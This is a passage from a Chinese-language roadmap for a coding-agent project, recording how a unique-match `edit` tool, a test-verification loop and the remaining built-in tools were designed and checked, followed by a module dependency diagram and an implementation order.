  - 逐条对账（2026-09-04 核实，证据在 `context/sections/core-section.ts`，44 行五节）：拆解→分步→验证→迭代 ⇒【任务执行流程】1-5 步；工具组合完成多步任务 ⇒【工具增强推理】（不确定就查 ls/read/grep、算不清就跑 bash、基于真实结果推理）+【场景判断】；错误排查重试 ⇒ 流程第 4 步（报错就读错误 → 定位 → 修复 → 重跑）；写完跑测试验证 ⇒【铁律】收尾必验证（禁止口头声称已验证）
  - 超出原案的部分：另有【工作记忆】节（TASK.md 复选框清单 + 检测到未勾选项时追加续传提示），把长任务的断点续传也写进了提示词
- [x] **精准编辑工具** —（2026-09-04 落地，实现与原案不同）原案：新增 apply_patch / editor（diff 式精准修改，不整体覆盖文件）。落地的是第 6 个内置工具 `edit`（`tools/builtin.ts`）：`oldText` 必须在文件中**唯一命中**才替换，0 命中与多命中都**拒绝且一字不落盘**，多命中回报候选行号（确认每处都该改时才传 `replaceAll: true`）
  - 为什么不用 diff/patch 格式：apply_patch 要模型输出带行号与上下文的补丁块，格式错一格整块作废；唯一原文片段把“定位对不对”这件事交给文件自己回答，模型只需照抄原文
  - 不用正则：`oldText` 里满是 `. * ( [ ?` 这类元字符，走正则就得转义，漏转一个就把“改这一处”变成“改一片”；改用 `indexOf` + 字面切片拼接
  - 字节级保真：纯 CRLF 文件在 `\n` 归一化副本上匹配、写回前整体还原（Windows 上 `core.autocrlf=true` 检出的源码就是 CRLF，不做这层则跨行 `oldText` 必然 0 命中，工具会在最需要它的地方失效）；BOM 自己按字节判、原样写回（实测 Node v24.12.0 用 utf-8 读**不剥** BOM，但不拿这种行为细节当设计依据）
  - 拒绝路径用 `[ERROR]` 前缀是**承重的**：agent-loop 只把 `[ERROR]`/`[VERIFY_FAILED]` 记作失败，而重复失败保护只在失败时计数——换成 `[NO_MATCH]` 会让模型拿同一个错 `oldText` 空转烧轮次而收不到提醒。已写成承重注释 + 断言
  - 配套改动：`ToolDefinition.permissionDetail?` 与 `ToolProvider.permissionDetail?` 都是**可选成员**（加必需成员会打坏 7 处替身），弹窗显示“改 路径: 旧 → 新”；agent-loop 把原先一个变量兼三职的 `detail` 拆成 `detail`（显示）+ `autoKey`（授权匹配），匹配键格式与改前逐字符相同，已记下的“本次全部允许”不会失配
  - 提示词侧：core-section【铁律】加一条“改一小段用 edit，不要 write 重抄全文”，write 的工具描述也加了流向 edit 的分流指引
  - 验证：新增 `scripts/verify-edit.ts` 41 项（唯一命中 / 两条拒绝路径 / 候选行号 / CRLF / BOM / 混合行尾 / 参数边界 / 弹窗文案单行契约），全量 13 套 420 项
  - 对标：Cline 的 apply_patch / editor（本项目取“唯一原文片段”而非补丁块）
- [x] **测试验证闭环** —（2026-09-04 核实后关闭）提示词 + 工具引导 Agent"改代码 → 跑测试 → 看结果 → 再改"
  - 理由：Agent 能写代码但不会自证正确；真实修 bug/写功能需要验证迭代
  - 闭环的四段各自落在哪（2026-09-04 核实）：改代码 ⇒ `edit` / `write` 工具；跑测试 ⇒ `bash` 工具 +【铁律】收尾必验证（项目没有测试入口时至少做语法/类型检查）；看结果 ⇒【任务执行流程】第 4 步；再改 ⇒ 同一步的“读错误 → 定位 → 修复 → 重跑”，另有重复失败保护兜底（同一调用连续失败 2 次即追加 [系统提示] 叫模型换路子、3 次叫它放弃这条路并向用户说明卡点）
  - 残留（未立项）：闭环全靠提示词约束，没有“改完自动跑测试”的机制（无 watch、无 pre-commit）——模型不调 bash 就没人替它调
- [ ] **实用工具补全** — 列表目录（ls）、网页抓取（fetch）、读取多文件（并行 read）
  - 理由：扩展可处理的任务类型（查项目结构/查网页/批量读）
  - 对标：Cline 的 fetch_web_content / pi 的 ls
  - 进度（2026-09-03）：**ls 已落地**（`tools/builtin.ts`），本条只剩 fetch 与并行 read 两项未做，故仍留 `- [ ]`。2026-09-04 又落地 `edit`（属上面“精准编辑工具”一条，与本条无关），内置工具现为 6 个：ls / read / write / edit / grep / bash。上一轮文档校准查出的“该划掉一半”即指此处
  - 补记（2026-09-04 深夜）：同日查出并修好了已有的 grep / bash 两个缺陷（见上面新增的“工具可靠性修复”一条）。它们不在本条的待办里（本条只管“还缺哪些工具”），但记在这里免得后人以为 6 个工具一直都是好的：grep 落地以来在本项目唯一的开发环境（中文 Windows）上一次也没真正搜到过东西（实测：搜一个确实存在的符号返回 `[NO_MATCH]`）

---

## 📊 依赖关系图

```
持久化存储 ──→ 上下   文管理 ──→ 工具系统 ──→ 技能系统
     │                  │
     └──→ 多会话管理     │
                        ↓
                   命令系统 ←──── 所有模块都需要
                        │
               ┌────────┴────────┐
               ↓                  ↓
          模型切换             事件订阅
                                  │
                                  ↓
                               RPC 模式
```

## 🧭 实施建议

1. **先做持久化**（P0）——当前一切都在内存里，重启归零，无法实际使用
2. **再做命令系统**（P1）——让用户能 `/model` 切模型、`/help` 看帮助
3. **然后上下文管理**（P0）——没有上下文控制，长对话必然崩溃
4. **接着工具系统**（P2）——Agent 真正做事的入口
